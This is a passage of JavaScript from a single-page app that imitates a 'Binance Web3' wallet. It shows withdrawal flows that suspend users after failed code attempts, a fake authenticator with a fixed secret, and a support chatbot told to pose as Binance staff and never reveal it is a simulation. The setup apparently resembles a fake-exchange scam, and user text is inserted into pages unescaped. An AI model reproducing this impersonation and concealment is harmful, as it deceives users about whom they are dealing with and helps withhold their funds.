                appState.withdrawalSuspensionEnd = Date.now() + (48 * 60 * 60 * 1000); // 48 hours
                appState.withdrawalAttempts.failedCount = 0; // Reset counter for next suspension period
                saveState();
                showMessage('Suspension', 'Withdrawal function suspended for 48 hours due to 5 incorrect code attempts.', 'error');
                showPage('home'); // Go back to home to show activity status
                return;
            }

            errorMsg.textContent += ` (Attempt ${failedCount} of 5)`;
        }

        function showWithdrawalProcessingPage() {
            const activity = appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing');
            if (activity) {
                document.getElementById('procAddress').textContent = activity.address;
                document.getElementById('procNetwork').textContent = activity.network;
                document.getElementById('procAmount').textContent = `$${activity.amount.toFixed(2)} USD`;
                showPage('withdrawalProcessingPage');
            } else {
                showMessage('Error', 'No active withdrawal found.', 'error');
                showPage('home');
            }
        }

        // =======================================================
        // 6. MARKET & CHART LOGIC
        // =======================================================

        /**
         * Initializes TradingView Chart Widget.
         */
        function initTradingView(containerId, symbol) {
            if (typeof TradingView === 'undefined') {
                console.error("TradingView script not loaded.");
                return;
            }

            // Check if the chart already exists to prevent duplication
            const container = document.getElementById(containerId);
            if (container.querySelector('iframe')) return;

            new TradingView.widget(
                {
                    "container_id": containerId,
                    "autosize": true,
                    "symbol": `BINANCE:${symbol}`,
                    "interval": "D",
                    "timezone": "Etc/UTC",
                    "theme": "dark",
                    "style": "1",
                    "locale": "en",
                    "toolbar_bg": "#f1f3f6",
                    "enable_publishing": false,
                    "allow_symbol_change": true,
                    "save_image": false,
                    "studies": [
                        "ROC@tv-basicstudies",
                        "StochasticRSI@tv-basicstudies",
                        "MASimple@tv-basicstudies"
                    ],
                    "overrides": {
                        "paneProperties.background": "#17171d",
                        "paneProperties.vertGridProperties.color": "#24242d",
                        "paneProperties.horzGridProperties.color": "#24242d",
                        "symbolWatermarkProperties.color": "rgba(255, 255, 255, 0.05)"
                    }
                }
            );
        }

        function updateHomeDashboard() {
            // Initialize main BTC/USDT chart
            initTradingView('tvChartContainer', 'BTCUSDT');
            loadHotCoins();
        }

        async function loadHotCoins() {
            const listContainer = document.getElementById('hotCoinsList');
            if (!listContainer) return;

            if (hotCoinsCache.length === 0) {
                try {
                    const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=6&page=1&sparkline=false`);
                    if (!response.ok) throw new Error('Failed to fetch hot coins');
                    hotCoinsCache = await response.json();
                } catch (e) {
                    listContainer.innerHTML = '<p class="col-span-2 text-danger text-center py-4">Failed to load hot coins.</p>';
                    return;
                }
            }

            let html = '';
            hotCoinsCache.forEach(coin => {
                const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
                const changeSign = coin.price_change_percentage_24h >= 0 ? '+' : '';

                html += `
                    <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="bg-card p-4 rounded-xl cursor-pointer hover:bg-surface transition-colors space-y-2 border border-gray-800">
                        <div class="flex items-center space-x-2">
                            <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/20x20/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-5 h-5 rounded-full" />
                            <p class="font-semibold text-sm">${coin.symbol.toUpperCase()}</p>
                        </div>
                        <p class="text-lg font-bold">$${coin.current_price.toFixed(2)}</p>
                        <p class="text-xs ${changeClass}">${changeSign}${coin.price_change_percentage_24h.toFixed(2)}% (24h)</p>
                    </div>
                `;
            });

            listContainer.innerHTML = html;
        }

        function showCoinChartModal(symbol) {
            const chartId = 'coinChartModalContainer';
            const modalId = 'coinChartModal';

            // Create a temporary modal structure
            let modal = document.getElementById(modalId);
            if (!modal) {
                modal = document.createElement('div');
                modal.id = modalId;
                modal.className = 'fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50';
                modal.innerHTML = `
                    <div class="modal-content w-full max-w-lg p-4 space-y-4">
                        <h3 class="text-xl font-bold">${symbol}/USDT Live Chart</h3>
                        <div class="bg-card rounded-xl overflow-hidden" style="height: 350px;">
                            <div id="${chartId}" class="w-full h-full"></div>
                        </div>
                        <button onclick="hideModal('${modalId}')" class="w-full btn-primary">Close</button>
                    </div>
                `;
                document.body.appendChild(modal);
            }

            document.getElementById(modalId).classList.remove('hidden');
            document.getElementById(modalId).classList.add('flex');

            // Initialize the specific chart
            // Timeout is needed to ensure the DOM element is rendered before TradingView tries to attach
            setTimeout(() => {
                initTradingView(chartId, `${symbol}USDT`);
            }, 100);
        }

        async function loadMarketData() {
            const mktCap = document.getElementById('mktCap');
            const mktVol = document.getElementById('mktVol');
            const topCoinsList = document.getElementById('topCoinsList');
            const newsContent = document.getElementById('newsContent');

            mktCap.textContent = '...';
            mktVol.textContent = '...';
            topCoinsList.innerHTML = '<p class="text-muted text-center py-4">Loading top coins...</p>';
            newsContent.innerHTML = '<p class="text-muted">Fetching latest news...</p>';

            try {
                // 1. Fetch Top Coins and Market Overview
                const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false`);
                if (!response.ok) throw new Error('Failed to fetch market data');
                const coins = await response.json();

                // 2. Simulate Market Overview (from the first coin for simplicity, or sum all)
                let totalMktCap = coins.reduce((acc, coin) => acc + (coin.market_cap || 0), 0);
                let total24hVol = coins.reduce((acc, coin) => acc + (coin.total_volume || 0), 0);

                const format = (num) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', notation: 'compact' }).format(num);

                mktCap.textContent = format(totalMktCap);
                mktVol.textContent = format(total24hVol);

                // 3. Render Top Coins List
                let coinHtml = coins.map(coin => {
                    const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
                    const changeSign = coin.price_change_percentage_24h >= 0 ? '▲' : '▼';
                    return `
                        <div class="flex items-center justify-between p-3 bg-surface rounded-lg border border-gray-800">
                            <div class="flex items-center space-x-3">
                                <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/24x24/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-6 h-6 rounded-full" />
                                <div>
                                    <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
                                    <p class="text-xs text-muted">${coin.name}</p>
                                </div>
                            </div>
                            <div class="text-right">
                                <p class="font-semibold">$${coin.current_price.toFixed(2)}</p>
                                <p class="text-xs ${changeClass}">${changeSign} ${Math.abs(coin.price_change_percentage_24h).toFixed(2)}%</p>
                            </div>
                        </div>
                    `;
                }).join('');
                topCoinsList.innerHTML = coinHtml;

                // 4. Simulate Market News/Launch Pool
                let launchCoin = coins.find(c => c.symbol.toLowerCase() === 'bnb') || coins[0];
                newsContent.innerHTML = `
                    <div class="p-3 bg-yellow-900/30 rounded-lg text-sm border border-yellow-700">
                        <p class="font-semibold text-yellow-400">Launch Pool:</p>
                        <p class="text-xs text-muted">Stake **${launchCoin.symbol.toUpperCase()}** to earn rewards in the new DeFi project launch. Starts in 48 hours!</p>
                    </div>
                    <p class="text-xs text-muted">**Market News:** Bitcoin dominance remains strong above 50% as institutional interest continues to rise.</p>
                    <p class="text-xs text-muted">**Live Prices:** Market data is updated from CoinGecko Public API every minute.</p>
                `;

            } catch (e) {
                console.error("Error loading market data:", e);
                topCoinsList.innerHTML = '<p class="text-danger text-center py-4">Failed to load market data.</p>';
            }
        }

        // =======================================================
        // 7. ACCOUNT & SECURITY LOGIC
        // =======================================================
        function updateAccountPage() {
            document.getElementById('accountUserID').textContent = appState.isConnected ? appState.userID : '---';
            document.getElementById('accountWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
            document.getElementById('accountWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
        }

        function updateAccountDetailsPage() {
            document.getElementById('detailUserID').textContent = appState.isConnected ? appState.userID : '---';
            document.getElementById('detailWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
            document.getElementById('detailWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
        }

        function updateGoogleAuthPage() {
            document.getElementById('authUserID').textContent = appState.isConnected ? appState.userID : '---';

            // Simulate QR Code and Secret Key generation using a placeholder
            const secretKey = 'A1B2C3D4E5F6G7H8';
            const issuer = 'BinanceWeb3';
            const accountName = appState.userID;
            const otpAuthUri = `otpauth://totp/${issuer}:${accountName}?secret=${secretKey}&issuer=${issuer}`;

            // We cannot use a real Google Auth API, so we use a placeholder QR and the fixed secret
            const qrContainer = document.getElementById('authQrCode');
            qrContainer.innerHTML = '';
            new QRCode(qrContainer, {
                text: otpAuthUri,
                width: 160,
                height: 160,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
            document.getElementById('authSecretKey').textContent = secretKey;
        }

        async function verifyGoogleAuthCode() {
            const code = document.getElementById('authCodeInput').value.trim();
            const errorMsg = document.getElementById('authCodeError');

            if (!code || code.length !== 6 || isNaN(code)) {
                errorMsg.textContent = 'Please enter a valid 6-digit code.';
                errorMsg.classList.remove('hidden');
                return;
            }

            errorMsg.classList.add('hidden');
            showLoading('Verifying Code...');
            await waitFor(5000); // 5-second loading for simulation

            // Simulated verification logic (only accept '123456' or '654321' for simulation)
            if (code === '123456' || code === '654321') {
                hideLoading();
                appState.isConnected = true; // Security is linked, keep wallet connected
                saveState();
                showMessage('Verification Successful!', 'Google Authenticator is now linked to your account.', 'success');
                showPage('accountDetails');
            } else {
                hideLoading();
                errorMsg.textContent = 'Verification failed. Please check the code and try again.';
                errorMsg.classList.remove('hidden');
            }
        }

        // =======================================================
        // 8. NOTIFICATION & SEARCH LOGIC
        // =======================================================
        function toggleNotifications(isOn) {
            appState.notificationOn = isOn;
            saveState();
            updateNotificationPage();
        }

        function updateNotificationPage() {
            const toggle = document.getElementById('notificationToggle');
            if (toggle) toggle.checked = appState.notificationOn;

            const notificationList = document.getElementById('notificationList');
            notificationList.innerHTML = appState.activities.filter(a => a.type === 'Deposit' || a.type === 'Withdrawal')
                .map(a => `
                    <div class="bg-card p-4 rounded-xl border-l-4 ${a.status === 'Success' ? 'border-success' : a.status === 'Failed' ? 'border-danger' : 'border-yellow-400'}">
                        <p class="font-semibold">${a.type} ${a.status}</p>
                        <p class="text-sm text-muted">${a.desc}</p>
                        <p class="text-xs text-muted mt-1">${new Date(a.date).toLocaleString()}</p>
                    </div>
                `).join('');

            // Add simulated market notifications
            notificationList.innerHTML += `
                <div class="bg-card p-4 rounded-xl border-l-4 border-yellow-400">
                    <p class="font-semibold">Market News Update</p>
                    <p class="text-sm text-muted">BTC price surged past $68,000 overnight. Volatility high.</p>
                    <p class="text-xs text-muted mt-1">${new Date().toLocaleTimeString()} - Today</p>
                </div>
                <div class="bg-card p-4 rounded-xl border-l-4 border-success">
                    <p class="font-semibold">Launch Pool Reminder</p>
                    <p class="text-sm text-muted">New staking opportunities available for BNB holders.</p>
                    <p class="text-xs text-muted mt-1">Yesterday</p>
                </div>
            `;
        }

        async function showDailyNotificationBanner() {
            const banner = document.getElementById('dailyNotificationBanner');
            const now = Date.now();
            const twelveHours = 12 * 60 * 60 * 1000;

            if (appState.notificationOn && now - appState.lastNotificationTime > twelveHours) {
                try {
                    // Fetch a random trending coin for the "news" banner
                    const response = await fetch(`${COINGECKO_API}/search/trending`);
                    const data = await response.json();
                    const trendingCoin = data.coins[0]?.item;
                    if (trendingCoin) {
                        document.getElementById('dailyNotificationMessage').textContent =
                            `🚀 Trending: ${trendingCoin.name} (${trendingCoin.symbol.toUpperCase()}) is up ${trendingCoin.data.price_change_percentage_24h.usd.toFixed(2)}% in the last 24h!`;
                        banner.classList.remove('hidden');
                        appState.lastNotificationTime = now;
                        saveState();
                    }
                } catch (e) {
                    console.error("Failed to fetch trending coin for banner:", e);
                }
            }
        }

        function hideDailyNotification() {
            document.getElementById('dailyNotificationBanner').classList.add('hidden');
        }

        // =======================================================
        // 9. SEARCH LOGIC
        // =======================================================

        let searchTimeout;
        document.getElementById('globalSearchInput').addEventListener('input', () => {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(performGlobalSearch, 500);
        });

        async function performGlobalSearch() {
            const query = document.getElementById('globalSearchInput').value.trim();
            const resultsDiv = document.getElementById('searchResults');

            if (query.length < 2) {
                resultsDiv.innerHTML = '<p class="text-sm text-muted text-center py-4">Start typing to search coins, markets, and news.</p>';
                return;
            }

            resultsDiv.innerHTML = '<p class="text-sm text-yellow-400 text-center py-4">Searching...</p>';

            try {
                // Search CoinGecko API for coins
                const response = await fetch(`${COINGECKO_API}/search?query=${query}`);
                if (!response.ok) throw new Error('Search failed');
                const data = await response.json();

                let html = '<h3 class="font-semibold text-lg border-b border-gray-800 pb-2 mb-2">Coins Found</h3>';

                if (data.coins.length > 0) {
                    html += data.coins.map(coin => `
                        <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="flex items-center justify-between p-2 bg-card rounded-lg cursor-pointer hover:bg-surface">
                            <div class="flex items-center space-x-3">
                                <img src="${coin.thumb}" class="w-6 h-6 rounded-full" />
                                <div>
                                    <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
                                    <p class="text-xs text-muted">${coin.name}</p>
                                </div>
                            </div>
                            <p class="text-xs text-yellow-400">View Chart &rarr;</p>
                        </div>
                    `).join('');
                } else {
                    html += '<p class="text-sm text-muted">No coins match your search.</p>';
                }

                // Simulate News/Market Results
                html += `
                    <h3 class="font-semibold text-lg border-b border-gray-800 pb-2 mb-2 mt-4">Market & News</h3>
                    <div class="bg-card p-3 rounded-lg text-sm space-y-1">
                        <p class="font-semibold">Market News</p>
                        <p class="text-xs text-muted">Showing results for market news related to "${query}".</p>
                    </div>
                `;

                resultsDiv.innerHTML = html;

            } catch (e) {
                resultsDiv.innerHTML = '<p class="text-danger text-center py-4">An error occurred during search.</p>';
            }
        }

        // =======================================================
        // 10. CHATBOT LOGIC (Simulated Gemini API)
        // =======================================================
        async function sendChatMessage() {
            const chatInput = document.getElementById('chatInput');
            const chatMessages = document.getElementById('chatMessages');
            const userMessage = chatInput.value.trim();

            if (!userMessage) return;

            // 1. Display user message
            const userMsgHtml = `
                <div class="flex justify-end">
                    <div class="bg-yellow-400 text-black p-3 rounded-xl rounded-br-none max-w-[80%] shadow-md">${userMessage}</div>
                </div>
            `;
            chatMessages.innerHTML += userMsgHtml;
            chatInput.value = '';
            chatMessages.scrollTop = chatMessages.scrollHeight;

            // 2. Display loading/bot response area
            const botLoadingId = 'bot-loading-' + Date.now();
            const botLoadingHtml = `
                <div class="flex justify-start" id="${botLoadingId}">
                    <div class="bg-card text-text p-3 rounded-xl rounded-bl-none max-w-[80%] shadow-md">
                        <div class="animate-pulse">...thinking...</div>
                    </div>
                </div>
            `;
            chatMessages.innerHTML += botLoadingHtml;
            chatMessages.scrollTop = chatMessages.scrollHeight;

            try {
                // Simulated API call structure
                const systemPrompt = "You are a friendly and knowledgeable Binance Web3 Wallet support assistant. Keep your responses concise and helpful. Do not mention that this is a simulation. Do not use markdown formatting.";
                const userQuery = userMessage;

                const payload = {
                    contents: [{ parts: [{ text: userQuery }] }],
                    systemInstruction: { parts: [{ text: systemPrompt }] },
                };

                const response = await fetch(GEMINI_API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();
                const botResponseText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Sorry, I'm having trouble connecting to the service right now. Please try again later.";

                // 3. Replace loading state with actual response
                const loadingElement = document.getElementById(botLoadingId);
                if (loadingElement) {
                    loadingElement.outerHTML = `
                        <div class="flex justify-start">
                            <div class="bg-card text-text p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-md">${botResponseText}</div>
                        </div>
                    `;
                }
            } catch (e) {
                console.error("Gemini API simulation failed:", e);
                const loadingElement = document.getElementById(botLoadingId);
                if (loadingElement) {
                    loadingElement.outerHTML = `
                        <div class="flex justify-start">
                            <div class="bg-danger/20 text-danger p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-md">
                                Support service connection failed. Please check your network.
                            </div>
                        </div>
                    `;
                }
            }
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        // =======================================================
        // 11. INITIALIZATION & MAIN LOOP
        // =======================================================

        function initApp() {
            loadState();
            updateUI();

            // Handle page persistence on refresh
            showPage(appState.currentPage);

            // Start countdown and suspension checks
            setInterval(checkCountdownAndSuspension, 1000);

            // Show daily market notification banner
            showDailyNotificationBanner();
            setInterval(showDailyNotificationBanner, 60 * 60 * 1000); // Check every hour

            // If a countdown is running, ensure we are on the processing page
            if (appState.withdrawalCountdownEnd > Date.now()) {
                showPage('withdrawalProcessingPage');
            }

            // Global event listeners for going back
            document.getElementById('header').addEventListener('click', (e) => {
                // If a non-main page is active, simulate back button behavior
                const nonMainPages = ['notification', 'search', 'chat', 'depositCoinSelectionPage', 'withdrawalDetailsPage', 'accountDetails', 'googleAuthVerification'];
                if (e.target.closest('button')) return; // Ignore button clicks in the header

                if (nonMainPages.includes(appState.currentPage)) {
                    // Simple back logic: Deposit flows go back one step, others go home/account
                    if (appState.currentPage === 'depositNetworkPage') showPage('depositCoinSelectionPage');
                    else if (appState.currentPage === 'depositAddressPage') showPage('depositNetworkPage');
                    else if (appState.currentPage === 'depositConfirmPage') showPage('depositAddressPage');
                    else if (appState.currentPage === 'withdrawalDetailsPage') showPage('home');
                    else if (appState.currentPage === 'withdrawalConfirmationPage') showPage('withdrawalDetailsPage');
                    else if (appState.currentPage === 'accountDetails' || appState.currentPage === 'googleAuthVerification') showPage('account');
                    else showPage('home');
                }
            });

            // Initial load of complex pages (Home/Market)
            updateHomeDashboard();
        }

        window.onload = initApp;

    </script>

</body>
</html>
